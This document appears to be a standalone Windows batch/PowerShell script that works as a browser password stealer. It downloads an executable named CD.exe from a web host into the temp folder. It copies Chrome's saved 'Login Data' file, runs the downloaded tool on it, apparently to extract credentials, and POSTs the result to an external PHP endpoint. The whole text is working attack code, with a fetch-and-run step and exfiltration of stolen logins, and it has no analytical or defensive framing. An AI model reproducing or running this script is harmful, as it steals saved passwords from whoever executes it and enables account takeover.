powershell "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"; "Invoke-WebRequest -Uri https://redcoconut.github.io/Redc/CD.exe -OutFile $env:temp/CD.exe -UseBasicParsing"
cd C:\Users\%Username%\AppData\Local\Temp

powershell "Copy-Item -Path \"C:\Users\$env:username\AppData\Local\Google\Chrome\User Data\Default\login data\" -Destination \"$env:temp\""; "rename-item -path \"$env:temp/login data\" -newname \"alakazam\""; "$One = cmd /c 'CD.exe alakazam'"; "$One = [string]::join(\"ENTERR\",($One.Split(\"`n\")))"; "$content = "$One""; "$URI = 'http://red.scienceontheweb.net/filetest.php'"; "$Body ='name=' + $content + '&B1=SUBMIT%21'"; "$page = Invoke-WebRequest $URI -body $Body -method POST" 
